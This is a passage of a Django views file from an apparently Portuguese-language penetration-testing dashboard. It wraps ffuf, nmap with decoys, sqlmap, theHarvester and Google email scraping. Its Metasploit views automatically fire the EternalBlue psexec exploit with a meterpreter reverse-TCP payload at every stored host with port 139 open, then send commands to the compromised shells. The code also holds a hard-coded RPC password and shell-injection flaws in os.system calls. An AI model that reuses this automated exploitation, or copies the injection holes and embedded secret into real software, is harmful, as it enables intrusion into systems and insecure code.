        porta_vai = ['']
    else:
        porta_vai = portas.split(',')

    print(porta_vai)



    if str(https) == "option2":
        https_vai = 'https://'
    else:
        https_vai = 'http://'

    print(https)


    dataAgora = dataAtual().replace(' ','')
    ipstring = ip
    print(ip)
    ip = ip + "/" + str(rede)
    ip = ip.replace('\n', '')
    ip = ip.replace(' ', '')
    ip = ip.replace('\t', '')
    print(rede)
    print(ip)
    dominio = ""
    try:
        ip3 = ipaddress.ip_network(ipstring)

    except:
        dominio = ipstring

        ipstring = domainIp(ipstring)
        ip = ipstring
        try:
            ip_string = ipaddress.ip_address(ip)
        except:
            return HttpResponse(f'IPERRADO{ip}')
    print("alo")
    print(ip)
    #res = subprocess.check_output("", shell=True)
    print("aqui?")
    usuario = User.objects.get(username= request.user)
    rede_vpn = request.POST.get('rede_vpn')
    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=usuario)
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    for ipinho in ipaddress.IPv4Network(ip,False):

        for portinha in porta_vai:
            dataAgora = dataAtual().replace(' ', '')
            if dominio != "":
                comando = f'ffuf  -c -w {wordlist} -u {https_vai}{dominio}:{portinha}{path_vai}FUZZ   ' + ' -o  arquivos/ffuf/' + str(dataAgora) + str(request.user) + f'.txt -of csv  {extencao_vai} &'
            else:
                comando = f'ffuf  -c -w {wordlist} -u {https_vai}{ipinho}:{portinha}{path_vai}FUZZ   ' + ' -o  arquivos/ffuf/' + str(
                    dataAgora) + str(request.user) + f'.txt -of csv  {extencao_vai} &'

            print(comando)
            print(dataAgora)
            #os.system(comando)
            ip_que_vai = verificarSeExisteSeNaoCriar(ipinho,usuario,Rede.objects.get(id=rede_vpn))
            CriarFfufComandos(ip_que_vai,dataAgora,usuario,comando,porta= portinha)

    return redirect('/')

def CriarFfufComandos(ip,dataAgora,usuario,comando,porta):
    FfufComandos.objects.create(ip=ip,
                                dataAgora=dataAgora,
                                usuario=usuario,
                                comando=comando,
                                porta=porta)

def verificarSeExisteSeNaoCriar(ip,usuario,rede):
    try:
        ip_que_vai = IP.objects.get(ip=ip,
                                    usuario=usuario,
                                    rede=rede)
    except:
        ip_que_vai = IP.objects.create(ip=ip,
                                       usuario=usuario,
                                       rede=rede)
    return ip_que_vai

@login_required(login_url='/login/')
def whatweb(request,id):
        try:
            Pentest_Rede.objects.get( rede=Diretorios.objects.get(id=id).ip.rede,usuario=User.objects.get(id=request.user.id))
        except:
            return HttpResponse("Você não tem permissão")
        data_Agora = dataAtual()
        ip = Diretorios.objects.get(id=id).ip
        porta = Diretorios.objects.get(id=id).porta
        path = Diretorios.objects.get(id=id).path
        res = os.system(f'whatweb {ip}:{porta}{path} '+   "--log-json=arquivos/whatweb/'whatweb"+data_Agora+"'")
        comando = f'whatweb {ip}:{porta}{path} '+   "--log-json=arquivos/whatweb/'whatweb"+data_Agora+"'"
        WhatWebComandos.objects.create(diretorio = Diretorios.objects.get(id=id),arquivo = "arquivos/whatweb/whatweb"+data_Agora)

        return redirect('/inicio/')
def verificarArquivoWhatWeb(arquivo,ip):
    with open(arquivo) as file:
        jsonsaida = json.load(file)


    for jsonzinho in jsonsaida:
        print("aqui")
        print(jsonzinho)
        for b in jsonzinho['plugins']:
            # print(jsonzinho['plugins'][b])
            for c in jsonzinho['plugins'][b]:
                try:
                    whatwebtitulo = WhatWeb.objects.get(Titulo =str(b))
                except:
                    whatwebtitulo = WhatWeb.objects.create(Titulo =str(b))

                try:
                    WhatWebIP.objects.get(whatweb=whatwebtitulo,
                                          nome = c,
                                          valor = jsonzinho['plugins'][b][c][0],
                                          ip = ip)
                except:
                    WhatWebIP.objects.create(whatweb=whatwebtitulo,
                                          nome=c,
                                          valor=jsonzinho['plugins'][b][c][0],
                                          ip=ip)

                print(c)




def blocoIP(ip):
    dataAgora = dataAtual()
    res = subprocess.check_output(' whois ' + str(ip)  + ' | grep "inetnum" | cut -d ":" -f2 |  cut -d "-" -f1',
                                  shell=True)
    print(res.decode("UTF-8").replace(' ',''))
    ipminimo = res.decode("UTF-8").replace(' ','')

    res = subprocess.check_output(' whois ' + str(ip) + ' | grep "inetnum" | cut -d ":" -f2 |  cut -d "-" -f2',
                                  shell=True)
    print(res.decode("UTF-8").replace(' ',''))
    ipmaximo = res.decode("UTF-8").replace(' ','')

    ipminimo = ipminimo.replace('\n', '')
    ipmaximo = ipmaximo.replace('\n', '')
    return ipminimo,ipmaximo


def scanredelocalip(request, ip, vpn):

    try:
        Pentest_Rede.objects.get(rede=vpn,usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")


    dataAgora = dataAtual()
    comando = "sudo nmap -Pn -D RND:20 " + ip + " -oX arquivos/nmap/'"+ str(dataAgora) + str(request.user) + "'.xml &"
    os.system(comando)

    usuario = User.objects.get(id=request.user.id)
    ip = verificarSeExisteSeNaoCriar(ip, usuario, vpn)

    Scan.objects.create(ip=ip,
                        dataAgora=dataAgora,
                        usuario=User.objects.get(username=request.user),
                        feito=0,
                        comando=comando,
                        )


def publicoDominio(request,dominio,rede_vpn):
    if dominio != "the":
        dominio = dominio
    else:
        dominio = request.POST.get('dominio')
    vpn = Rede.objects.get(id=rede_vpn)

    try:
        Pentest_Rede.objects.get(rede=vpn,usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")

    res = subprocess.check_output('host -t A '+   str(dominio) + ' | cut -d " " -f4', shell=True)
    res = res.decode("UTF-8").replace(' ', '')
    res = res.replace('\n', '')

    print(res)
    ipminimo, ipmaximo = blocoIP(res)
    ipminimoVai = ipminimo.replace('\n','')
    ipmaximoVai = ipmaximo.replace('\n','')

    if ipmaximo == "":
        pass
    else:
            print("etrou")

            print(ipminimo)

            ip = ipaddress.IPv4Address(ipminimoVai)
            print(ip)
            print("aquiiiii")
            print(ipmaximoVai)
            while ipaddress.IPv4Address(ip) != ipaddress.IPv4Address(ipmaximoVai) + 1:
                scanredelocalip(request, str(ip),vpn)

                try:
                    ip2 = IP.objects.get(ip=str(ip),rede=vpn)
                except:
                    if ipaddress.ip_address(ip).is_private == True:
                        redelocal = 1
                    else:
                        redelocal = 0
                    ip2 = IP.objects.create(ip=str(ip),
                                                 usuario=User(request.user.id),
                                                 ativo=0,
                                            redelocal = redelocal,
                                             rede = vpn
                                          )
                ip = ip + 1

    ipminimo = ipminimoVai
    ipmaximo = ipmaximoVai

    ipObjetomin = IP.objects.get(ip=ipminimo,rede=vpn)
    ipObjetomax = IP.objects.get(ip=ipmaximo,rede=vpn)


    try:
        Dominio.objects.get(nome=dominio,ip__rede=vpn).nome

    except:
        scanredelocalip(request.user, res, vpn)
        ipObjeto = IP.objects.get(ip = res,rede=vpn)

        Dominio.objects.create(nome = dominio,
                                ip = ipObjeto,
                              )


    try:


        inet = inetNum.objects.get(ipMinimo_ip = ipObjetomin, ipMaximo_ip=ipObjetomax)
    except:
        inet = inetNum.objects.create(ipMinimo_ip=ipObjetomin, ipMaximo_ip=ipObjetomax)

    try:
        dominioinetNum.objects.get(Dominio = Dominio.objects.get(nome = dominio,ip__rede=vpn))
    except:
        dominioinetNum.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),bloco=inet)

    #Dominio = models.ForeignKey(Dominio, models.CASCADE)
    #bloco = models.ForeignKey(inetNum, models.CASCADE)



    try:
        Dominio.objects.get(nome=dominio,ip__rede=vpn).nome

    except:
        scanredelocalip(request.user, res, vpn)
        ipObjeto = IP.objects.get(ip = res,rede=vpn)

        Dominio.objects.create(nome = dominio,
                                ip = ipObjeto,
                              )
    try:
        spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
        vulneravelSpf = spf.vulneravel
        descricaoSpf  = spf.descricao
    except:
        vulneravelSpf = "Ainda não sabemos"
        descricaoSpf = "Não tem descrição"

    try:
        emails = Emails.objects.filter(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn))

        res2 = subprocess.check_output("sudo service tor start", shell=True)
        try:
            res2 = subprocess.check_output("sudo python3 /opt/karma/karma-master/bin/karma.py target -o arquivos/publico/email/"+str(dominio), shell=True)
            res2 = res2.decode("UTF-8").replace(' ', '')
            res2 = res2.replace('\n', '')
            print(res2)
        except:
            res2 = "Karma não encontrado"

    except:
        emails = ""
    dados  = { "dominio": Dominio.objects.get(nome = dominio,ip__rede=vpn).nome,
               "ip":IP.objects.get(ip = res,rede=vpn).ip,
               "spf": vulneravelSpf,
               "descricao": descricaoSpf,
               "emails": emails,
               "scans": verificarScan()
               }

    return render(request,'dominio.html',dados)


def verDominio(request,dominio,rede):
    usuario = User.objects.get(id=request.user.id)

    if rede == "WQFQWFUQWHFQWHFQWHFIWIF":
        try:
            rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
            print(rede)
            return redirect(rede)
        except:
            return HttpResponse("crie uma rede associada a esse usuário")
    else:
        rede = requests.utils.unquote(rede)
        try:
            vpn = Rede.objects.get(rede=rede)
        except:
            return  HttpResponse("Rede não existe")
        try:
            rede = Pentest_Rede.objects.get(rede=vpn,usuario=usuario)
        except:
            return HttpResponse("crie um pentest para essa rede")



    verificarPermissoesRedePentest(vpn.id,request)

    try:
        spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
        vulneravelSpf = spf.vulneravel
        descricaoSpf  = spf.descricao
    except:
        vulneravelSpf = "Ainda não sabemos"
        descricaoSpf = "Não tem descrição"
    try:
        emails = Emails.objects.filter(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn))
    except:
        emails = ""

    bloco = dominioinetNum.objects.get(Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn)).bloco
    ipminimo = bloco.ipMinimo_ip.ip
    ipmaximo = bloco.ipMaximo_ip.ip

    ips_vetor = []
    ip = ipaddress.IPv4Address(ipminimo)
    print(ip)
    print("aquiiiii")
    while ipaddress.IPv4Address(ip) != ipaddress.IPv4Address(ipmaximo) + 1:
        ip_objeto = IP.objects.get(ip=ip,rede=vpn)
        if ip_objeto.ativo == "up":
            ips_vetor.append(ip_objeto)
        ip = ip + 1

    ips_ativos = ips_vetor

    class PortasQuantidades:
        def __init__(self,ip,quantidade):
            self.ip =  ip
            self.quantidade = quantidade
    portas_quantidades = []
    for ips_quantidade in ips_ativos:
        portas_quantidades.append(PortasQuantidades(ips_quantidade,len(Porta.objects.filter(ip=ips_quantidade,ativo=1))))


    portas = Porta.objects.all()

    rede = Pentest_Rede.objects.filter(usuario=usuario)[0].rede.rede
    diretorios = Diretorios.objects.filter(ip__rede=vpn)

    redes = Pentest_Rede.objects.filter(usuario=usuario)
    dados = {
    "dominio": Dominio.objects.get(nome=dominio, ip__rede=vpn).nome,
    "ip_dominio": Dominio.objects.get(nome=dominio, ip__rede=vpn).ip,
    "spf": vulneravelSpf,
    "descricao": descricaoSpf,
    "emails": emails,
        "portas":portas,
        "ips":ips_ativos,'diretorios':diretorios,'rede':rede,'redes':redes,
        "subdominios":SubDominio.objects.filter(Dominio = Dominio.objects.get(nome=dominio, ip__rede=vpn)),
        "portas_quantidades":portas_quantidades

    }

    return render(request,'dominio.html',dados)


def SPF(request,dominio,rede_vpn):
    dataAgora = dataAtual()
    vpn = Rede.objects.get(id=rede_vpn)

    verificarPermissoesRedePentest(rede_vpn,request)


    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    res = subprocess.check_output("host -t txt " + str(dominio) + " | grep '?all'", shell=True)
    res = res.decode("UTF-8").replace(' ','')
    print(res)
    print("aqui0")
    try:
        spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
    except:

        if res == "":
            res = subprocess.check_output("host -t txt " + str(dominio) + " | grep '~all'", shell=True)
            res = res.decode("UTF-8").replace(' ', '')
            print(res)
            print("aqui")

            if res == "":
                print(res)
                print("aqui3")

                try:
                    spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
                    spf.vulneravel = 2
                    spf.descricao = res
                    spf.save()
                except:
                    spfDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),
                                          vulneravel=2,
                                          descricao=res)



            else:
                print(res)
                print("aqui4")
                try:
                    spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
                    spf.vulneravel = 1
                    spf.descricao = res
                    spf.save()
                except:
                    spfDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn),
                                              vulneravel=1,
                                              descricao=res)


        else:
            try:
                spf = spfDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio,ip__rede=vpn))
                spf.vulneravel = 0
                spf.descricao = res
                spf.save()
            except:
                spfDominio.objects.create(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn),
                                          vulneravel = 0,
                                          descricao = res)
        return redirect('/')

def EmailsFuncao(request,dominio,rede_vpn):
    contador = 0
    verificarPermissoesRedePentest(rede_vpn,request)

    os.system("rm -f arquivos/publico/email/" + str(dominio))

    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    vpn = Rede.objects.get(id=rede_vpn)
    while (contador < 100):
        os.system("echo 'página" + str(int(contador / 10)) + "' ")
        os.system('sudo lynx --dump "https://google.com/search?&q=intext:' + str(dominio) + '&start=' + str(
            contador) + '" | grep "@"' + str(dominio) + '>> arquivos/publico/email/' + str(dominio))
        contador = contador + 10
        time.sleep(10)

    LimparEmail(dominio,vpn)


    return redirect('/')

def LimparEmail(dominio,vpn):
    import re
    ref_arquivo = open("arquivos/publico/email/"+str(dominio), "r")

    m = re.findall(r"\w*@" + str(dominio), ref_arquivo.read())
    emails = []
    print(ref_arquivo)
    for a in m:
        if a in emails:
            pass
        else:
            if a != "@" + str(dominio):
                emails.append(a)
    print(emails)
    ref_arquivo.close()
    os.system("rm -f arquivos/publico/email/"+str(dominio))
    for a in emails:

        try:
            Emails.objects.get(email = a,
                               Dominio= Dominio.objects.get(nome=dominio,ip__rede = vpn))
        except:

            Emails.objects.create(email = a,
                                  Dominio= Dominio.objects.get(nome=dominio,ip__rede = vpn))
        os.system("echo '" + str(a) + "' >> arquivos/publico/email/"+str(dominio))

@login_required(login_url='/login/')
def ligarMetaSploi(request):
    class Ips:
        def __init__(self,ip,sessao):
            self.ip =  ip
            self.sessao = sessao

    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)

    print(client.sessions.list)

    hosts_invadidos = []


    for a in client.sessions.list:
        dicionario = {}
        c = client.sessions.list


        ip = Ips(str(c[str(a)]['session_host']),a)
        hosts_invadidos.append(ip)



    """
    porta_saida = 4444
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = '172.16.1.233'
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = '172.20.1.103'
    payload['LPORT'] = porta_saida
    porta_saida = porta_saida + 1
    print(exploit.execute(payload=payload))
    """
    dados = {
        "hosts": hosts_invadidos,
    }
    return render(request,'shell.html',dados)



@login_required(login_url='/login/')
def procurarExploits(request):
    class Ips:
        def __init__(self,ip,sessao):
            self.ip =  ip
            self.sessao = sessao

    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)


    exploits=  client.modules.exploits
    return render(request,'exploits.html',{'exploits':exploits})

@login_required(login_url='/login/')
def exploit3(request,sessao):
    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)

    comando = request.POST.get('comando')

    shell = client.sessions.session(sessao)
    if comando == None:
        comando = 'ipconfig'
    shell.write(comando)
    print(comando)
    time.sleep(5)
    dados = {"saida": str(shell.read()),
             "sessao": sessao}
    return render(request,'shell.html',dados)



@login_required(login_url='/login/')
def exploit(request):
    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)
    ip_entrou = []
    porta_saida = 9998

    for ip in IP.objects.all():
        validar = 0
        for a in client.sessions.list:
            c = client.sessions.list

            if str(ip.ip) == str(c[str(a)]['session_host']):
                validar = 1
        validando_porta = 0
        if validar == 0:
            for porta in Porta.objects.filter(ip=ip):
                #print(porta.porta)
                if int(porta.porta) == 139:
                    validando_porta=1
            if validando_porta == 1:
                    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)

                    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
                    exploit['RHOSTS'] = str(ip.ip)
                    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
                    payload['LHOST'] = '172.20.1.184'
                    payload['LPORT'] = porta_saida
                    #print(ip.ip)
                    porta_saida = porta_saida + 1
                    exploit.execute(payload=payload)
                    print("IP: " + str(ip.ip) + " porta: " + str(porta_saida))
                    #print(client.sessions.list)
                    #print(type(client.sessions.list))

                    for aa in client.sessions.list:
                        cc = client.sessions.list
                        print("sessões")
                        print(cc[str(aa)]['session_host'])

        #print(a['session_host'])
    #print(client.consoles.)
    #print(client.module)
    #exploit = client.modules.use('exploit', 'CVE-2017-0143')
    #print(exploit)
    """
    for a in client.modules.exploits:
        exploit = client.modules.use('exploit', a)
        print(exploit.options)
    """
    #shell = client.sessions.session('1')
    #shell.write('exit')
    #print(shell.read())
    return redirect('/exploit')




@login_required(login_url='/login/')
def usandoExploit(request):
    exploit = request.POST.get('exploit')

    class Ips:
        def __init__(self,ip,sessao):
            self.ip =  ip
            self.sessao = sessao

    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)




    exploits=  client.modules.use('exploit',exploit)
    exploits_opcao = exploits.options
    exploits_requerido = exploits.missing_required
    exploit_payload = exploits.targetpayloads()
    return render(request,'opcoesExploit.html',{'exploit':exploit,'exploits':exploits.description,'opcoes':exploits_opcao,'obrigatorio':exploits_requerido,'payloads':exploit_payload})

@login_required(login_url='/login/')
def rodandoExploit(request):
    pass
    """
    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)

    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = str(ip.ip)
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = '172.20.1.184'
    payload['LPORT'] = porta_saida
    # print(ip.ip)
    porta_saida = porta_saida + 1


    exploit.execute(payload=payload)
    """

@login_required(login_url='/login/')
def rodandoExploitCerto(request):
    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)
    objeto = ExploitRodar.objects.get(id=request.POST.get('objeto'))

    exploit = client.modules.use('exploit', objeto.exploit)
    payload = client.modules.use('payload',objeto.payload)

    for requestinho in request.POST:
        print(requestinho)

        if requestinho in payload.options:
            if request.POST.get(requestinho) != "":
                try:
                    payload[requestinho] = str(request.POST.get(requestinho))
                except:
                    try:
                        payload[requestinho] = bool(request.POST.get(requestinho))
                    except:

                        try:
                            payload[requestinho] = float(request.POST.get(requestinho))
                        except:
                            pass

                Exploit_Payload.objects.create(exploit=objeto,
                                               nome=requestinho,
                                               conteudo=payload[requestinho],
                                               tipo = 1)



    # saida = exploit.execute(payload=payload)
    return redirect('/rodarExploits/')


@login_required(login_url='/login/')
def rodandoExploit(request):
    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)
    exploit  = client.modules.use('exploit', request.POST.get('exploit'))
    payload = client.modules.use('payload', request.POST.get('payload'))

    exploit_rodar = ExploitRodar.objects.create(nome='Criado Via views.py', exploit= request.POST.get('exploit'), payload=request.POST.get('payload'))
    for requestinho in request.POST:
        print(requestinho)



        if requestinho in exploit.options:
                if  request.POST.get(requestinho) != "":
                    try:
                        exploit[requestinho]=  request.POST.get(requestinho)
                    except:
                        try:
                            exploit[requestinho]=  bool(request.POST.get(requestinho))
                        except:
                            exploit[requestinho]=  float(request.POST.get(requestinho))

                    Exploit_Payload.objects.create(exploit=exploit_rodar,
                                                   nome= requestinho,
                                                   conteudo=exploit[requestinho])


        if requestinho in payload.options:
                if  request.POST.get(requestinho) != "":
                    payload[requestinho]=  request.POST.get(requestinho)


    exploits_opcao = payload.options
    exploits_requerido = payload.missing_required

    #saida = exploit.execute(payload=payload)
    return render(request,'payloadOpcoes.html',{'exploit':exploit,'exploits':exploit.description,'opcoes':exploits_opcao,'obrigatorio':exploits_requerido,'objeto':exploit_rodar})


@login_required(login_url='/login/')
def exploit3(request,sessao):



    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)
    comando = request.POST.get('comando')

    shell = client.sessions.session(sessao)
    if comando == None:
        comando = 'ipconfig'
    shell.write(comando)
    print(comando)
    time.sleep(5)
    resposta = str(shell.read())
    dados = {"saida": resposta,
             "sessao": sessao}
    return render(request,'shell.html',dados)

def deletarImagens():
    os.system('rm static/graficos/*.png')
def LigarMetaexploit():
    try:
        client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)
        #os.system(f'msfrpcd -P {SenhaMsfConsole.objects.get(id=1).senha} -S')

    except:
        try:
            SenhaMsfConsole.objects.create(id=1,
                                           senha ="Z1rS5DW#9N1e" )
            os.system(f'msfrpcd -P {SenhaMsfConsole.objects.get(id=1).senha} -S')
        except:
            os.system(f'msfrpcd -P {SenhaMsfConsole.objects.get(id=1).senha} -S')


def theHarvester(request,dominio,rede_vpn):
    contador = 0
    verificarPermissoesRedePentest(rede_vpn,request)

    os.system(f'rm -f theHarvester/resultado{dominio}.xml')

    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    vpn = Rede.objects.get(id=rede_vpn)


    res = os.system(f'theHarvester -d {dominio} -l 100 -b google -f arquivos/theHarvester/resultado{dominio}.xml')
    time.sleep(10)
    import xml.etree.ElementTree as ET
    tree = ET.parse(f'arquivos/theHarvester/resultado{dominio}.xml')
    root = tree.getroot()
    usuario  = User.objects.get(id=request.user.id)

    for child in root:
        print(child.tag)
        print(child.text)
        if child.tag == 'email':
            try:
                Emails.objects.get(email=child.text,
                                   Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn))
            except:

                Emails.objects.create(email=child.text,
                                      Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn))

        if child.tag == 'host':

            try:
                    print(child.find('ip').text)
                    print(child.find('hostname').text)
                    try:
                        verificarSeExisteSeNaoCriar(child.find('ip').text, usuario, vpn)
                        SubDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn),
                                               host=child.find('hostname').text,
                                               ip=IP.objects.get(ip=child.find('ip').text,rede=vpn))
                    except:
                        SubDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn),
                                               host=child.find('hostname').text,
                                               ip=IP.objects.get(ip=child.find('ip').text, rede=vpn))

            except:
                    print(child.find('ip'))


    return redirect('/')


def verExploitsRodar(request):
    opcoes = ExploitRodar.objects.all()

    return render(request,'rodarExploits.html',{'opcoes':opcoes})


def rodar(request,id):
    exploit_objeto = ExploitRodar.objects.get(id=id)



    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)

    exploit = client.modules.use('exploit', exploit_objeto.exploit)

    conteudo_Exploit = Exploit_Payload.objects.filter(exploit=exploit_objeto, tipo=0)

    for conteudo  in conteudo_Exploit:
        exploit[conteudo.nome] = conteudo.conteudo
    payload = client.modules.use('payload', exploit_objeto.payload)

    conteudo_Payload = Exploit_Payload.objects.filter(exploit=exploit_objeto, tipo=1)
    for conteudo  in conteudo_Payload:
        payload[conteudo.nome] = conteudo.conteudo


    exploit.execute(payload=payload)
    return redirect('/exploit2')


def sqlmap(request,id):
    data_Agora = dataAtual()
    try:
        Pentest_Rede.objects.get(rede=Diretorios.objects.get(id=id).ip.rede,
                                 usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("Você não tem permissão")
    diretorio_objeto = Diretorios.objects.get(id=id)
    ip = Diretorios.objects.get(id=id).ip.ip
    ip_objeto = Diretorios.objects.get(id=id).ip
    porta = Diretorios.objects.get(id=id).porta
    path = Diretorios.objects.get(id=id).path

    queryparameters = QueryParameteres.objects.filter(diretorio=diretorio_objeto)

    querys = "?"
    for query in queryparameters:
        querys = querys + f'{query.parametro}={query.valor}&'
    querys = querys[:-1]
    path = path + querys
    if porta == 443:
        comando = f'sqlmap -u "https://{ip}:{porta}{path}"  --answers="follow=Y"  --random-agent --batch | tee arquivos/sqlmap/"{request.user}{data_Agora}".txt '

        saida_sqlmap = subprocess.check_output(comando,shell=True)
    else:
        comando = f'sqlmap -u "http://{ip}:{porta}{path}"  --answers="follow=Y"  --random-agent --batch | tee arquivos/sqlmap/"{request.user}{data_Agora}".txt '

        saida_sqlmap = subprocess.check_output(comando,shell=True)

    SqlComandos.objects.create(ip=ip_objeto,
                                dataAgora=data_Agora,
                                usuario=request.user,
                                comando=comando,
                                porta=porta,
                               diretorio=diretorio_objeto)

@login_required(login_url='/login/')
def handle_xml_upload(request):
    xmlfile = request.FILES['xmlfile']
    print(xmlfile)
    rede_vpn = request.POST.get('rede_vpn')
    comando = request.POST.get('comando')

    usuario  = User.objects.get(id=request.user.id)

    try:
        ip = IP.objects.filter(rede = Rede.objects.get(id=rede_vpn))[0]
    except:
        ip = verificarSeExisteSeNaoCriar('127.0.0.1',usuario, Rede.objects.get(id=rede_vpn))
    dataAgora = dataAtual().replace(' ', '')

    Scan.objects.create(ip=ip,
                        dataAgora=dataAgora,
                        usuario=User.objects.get(username=request.user),
                        feito=0,
                        comando=comando,
                        )
    usuario = request.user
    lerArquivoXml(dataAgora,usuario,xmlfile)

    filename = str(xmlfile)
    with open(filename, 'wb+') as f:
        for chunk in xmlfile.chunks():
            f.write(chunk)
    print(f'movendo "{filename}" arquivos/nmap/"{dataAgora}{request.user}".xml')
    os.system(f'mv "{filename}" arquivos/nmap/"{dataAgora}{request.user}".xml')

    lerArquivoXml(dataAgora,usuario,"")


    return redirect(f'/inicio/{Rede.objects.get(id=rede_vpn).rede}')

@login_required(login_url='/login/')
def parserSite(request,id):
        try:
            Pentest_Rede.objects.get( rede=Diretorios.objects.get(id=id).ip.rede,usuario=User.objects.get(id=request.user.id))
        except:
            return HttpResponse("Você não tem permissão")
        data_Agora = dataAtual()
        diretorio_objeto =  Diretorios.objects.get(id=id)
        ip = Diretorios.objects.get(id=id).ip.ip
        ip_objeto = Diretorios.objects.get(id=id).ip
        porta = Diretorios.objects.get(id=id).porta
        path = Diretorios.objects.get(id=id).path

        queryparameters = QueryParameteres.objects.filter(diretorio=diretorio_objeto)

        querys = "?"
        for query in queryparameters:
            querys=querys+f'{query.parametro}={query.valor}&'
        querys = querys[:-1]
        path = path + querys

        from bs4 import BeautifulSoup
        import requests
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
        try:
            r = requests.get(f'http://{ip}:{porta}{path}', headers=headers)
        except:
            r = requests.get(f'https://{ip}:{porta}{path}', headers=headers)


        from urllib.parse import urlparse
        soup = BeautifulSoup(r.text, 'html.parser')
        artist_name_list_items = soup.find_all('a')
        print(artist_name_list_items)
        listateste = []
        for artist_name in artist_name_list_items:
            names = artist_name.get('href')
            print(names)
            if names[0] == "/":
                path = names
            else:

                splitando = path.split('/')

                variavel_tamanho = len(splitando)

                splitando[variavel_tamanho - 1] = str(names)
                voltando = ""
                for voltar in splitando:
                    voltando = voltando + voltar + "/"

                voltando = voltando[:-1]
                path = voltando

            try:
                    path_filtrar = f'{path}'.split('?')[0]
                    listateste.append(f'{path}'.split('?')[1])
            except:
                    path_filtrar = path

            diretorio = verificarSeExisteDiretorioSeNaoCriar(ip_objeto, porta, path_filtrar, 200, path)
            alterarDiretoriosHttpCode(ip_objeto, porta, path_filtrar, 200, diretorio, path)

        return redirect('/inicio/')


def verificarQuantidadeVulnerabilidade(param,request,id_rede,ip):
    baixa = 0
    intermediaria = 0
    alta = 0
    critica = 0
    if param == "Todos":
        vulns =  Vulnerabilidades.objects.filter(ip__usuario= request.user)
    if id_rede != "":
        rede_objeto = Rede.objects.get(id=id_rede)
        vulns = Vulnerabilidades.objects.filter(ip__usuario=request.user,ip__rede=rede_objeto)
    if ip != "":
        vulns = Vulnerabilidades.objects.filter(ip=ip)
    portas_vul = []
    for vuln in vulns:
            print(vuln)
            cvss_inteiro = float(str(vuln.getIntegerTratar()).split(" ")[0])
            if float(cvss_inteiro) >= 7.5:
                critica = critica + 1
            if float(cvss_inteiro) < 7.5 and float(cvss_inteiro) >= 5:
                alta = alta + 1
            if float(cvss_inteiro) < 5 and float(cvss_inteiro) >= 2.5:
                intermediaria = intermediaria + 1

            if float(cvss_inteiro) < 2.5:
                baixa = baixa + 1
            if vuln.porta.porta in portas_vul:
                pass
            else:
                portas_vul.append(vuln.porta.porta)



    return baixa,intermediaria,alta,critica,portas_vul

def cursos(request):
    nome = "cursos"
    try:
        baixa, intermediaria, alta, critica,portas_vuln = verificarQuantidadeVulnerabilidade("Todos",request,"","")


    except:
        baixa = 0
        intermediaria = 0
        alta = 0
        critica = 0

    nome = {"usuario": request.user, "assuntos": Pentest_Rede.objects.filter(usuario=request.user),
            "nome": nome,
            "assuntos_ramo": Etapas.objects.all(),
